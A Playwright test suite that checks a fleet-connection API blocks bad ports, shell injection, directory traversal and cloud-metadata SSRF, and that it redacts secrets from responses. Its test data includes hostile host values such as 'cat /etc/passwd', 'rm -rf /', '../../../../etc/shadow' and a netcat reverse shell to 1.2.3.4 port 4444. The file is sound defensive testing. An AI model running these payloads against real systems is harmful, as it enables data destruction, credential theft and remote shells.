import { test, expect } from '@playwright/test'

test.describe('Product A (AdinKhepra ASAF) — Sekhem Ingress/Egress Membrane Security Suite', () => {

  test.describe('Battery 1: Input Validation & Boundary Fuzzing (ASAF-004)', () => {
    test('rejects negative port numbers', async ({ request }) => {
      const res = await request.post('/api/fleet/test-connection', {
        data: {
          host: '127.0.0.1',
          port: -1,
          protocol: 'ssh'
        }
      })
      expect(res.status()).toBe(400)
      const data = await res.json()
      expect(data.ok).toBe(false)
      expect(data.rule).toBe('ASAF-004')
      expect(data.message).toContain('Port out of valid boundary limits')
    })

    test('rejects oversized port numbers (> 65535)', async ({ request }) => {
      const res = await request.post('/api/fleet/test-connection', {
        data: {
          host: '127.0.0.1',
          port: 99999,
          protocol: 'ssh'
        }
      })
      expect(res.status()).toBe(400)
      const data = await res.json()
      expect(data.ok).toBe(false)
      expect(data.rule).toBe('ASAF-004')
    })
  })

  test.describe('Battery 2: Command Injection & Metacharacter Blocking (ASAF-001 / ASAF-002)', () => {
    test('blocks shell command injection payloads in host field', async ({ request }) => {
      const maliciousHosts = [
        '127.0.0.1; cat /etc/passwd',
        'localhost && rm -rf /',
        '10.0.0.1 | whoami',
        '`id`',
        '$(uname -a)'
      ]

      for (const host of maliciousHosts) {
        const res = await request.post('/api/fleet/test-connection', {
          data: { host, port: 22, protocol: 'ssh' }
        })
        expect(res.status()).toBe(400)
        const data = await res.json()
        expect(data.ok).toBe(false)
        expect(data.rule).toBe('ASAF-001')
        expect(data.message).toContain('Shell metacharacters')
      }
    })

    test('blocks directory traversal attempts in host field', async ({ request }) => {
      const res = await request.post('/api/fleet/test-connection', {
        data: { host: '../../../../etc/shadow', port: 22, protocol: 'ssh' }
      })
      expect(res.status()).toBe(400)
      const data = await res.json()
      expect(data.ok).toBe(false)
      expect(data.rule).toBe('ASAF-002')
    })
  })

  test.describe('Battery 3: SSRF & Cloud Metadata Blackhole (ASAF-003)', () => {
    test('blocks AWS/GCP/Azure link-local metadata address 169.254.169.254', async ({ request }) => {
      const res = await request.post('/api/fleet/test-connection', {
        data: { host: '169.254.169.254', port: 80, protocol: 'ssh' }
      })
      expect(res.status()).toBe(400)
      const data = await res.json()
      expect(data.ok).toBe(false)
      expect(data.rule).toBe('ASAF-003')
      expect(data.message).toContain('cloud metadata address')
    })
  })

  test.describe('Battery 4: Outbound Egress Secret Scrubbing', () => {
    test('redacts sensitive credentials and keys from API response', async ({ request }) => {
      const res = await request.post('/api/fleet/test-connection', {
        data: {
          host: '127.0.0.1',
          port: 3000,
          protocol: 'ssh',
          password: 'TopSecretPassword123!',
          privateKey: '-----BEGIN OPENSSH PRIVATE KEY-----\nMIIEogIBAAKCAQEA0...'
        }
      })

      const rawText = await res.text()
      // Raw secrets must never appear in response body or logs
      expect(rawText).not.toContain('TopSecretPassword123!')
      expect(rawText).not.toContain('BEGIN OPENSSH PRIVATE KEY')

      // Headers check
      expect(res.headers()['x-sekhem-fp']).toBeDefined()
      expect(res.headers()['x-sekhem-fp']).toMatch(/^v1:asaf-[a-z-]+:[0-9TZ:.-]+:[a-f0-9]{16}$/)
    })
  })

  test.describe('Battery 5: Fleet Enrollment Attestation & Ingress Validation', () => {
    test('blocks malicious injection during asset enrollment', async ({ request }) => {
      const res = await request.post('/api/fleet/enroll', {
        data: {
          host: '10.0.0.1; nc -e /bin/sh 1.2.3.4 4444',
          port: 22,
          protocol: 'ssh'
        }
      })
      expect(res.status()).toBe(400)
      const data = await res.json()
      expect(data.rule).toBe('ASAF-001')
    })

    test('successfully enrolls legitimate asset with ML-DSA-65 signed attestation node', async ({ request }) => {
      const res = await request.post('/api/fleet/enroll', {
        data: {
          host: '127.0.0.1',
          port: 22,
          protocol: 'ssh',
          authMethod: 'Password',
          username: 'secops',
          targetEnclave: 'DOD-CMMC-Zone'
        }
      })
      expect(res.status()).toBe(200)
      const data = await res.json()
      expect(data.ok).toBe(true)
      expect(data.asset.id).toMatch(/^asset-[a-f0-9]{8}$/)
      expect(data.asset.attestation.signature).toBe('ML-DSA-65_VERIFIED')
      expect(data.asset.attestation.dagNode).toMatch(/^dag-[a-f0-9-]+$/)
      expect(res.headers()['x-sekhem-fp']).toBeDefined()
    })
  })
})
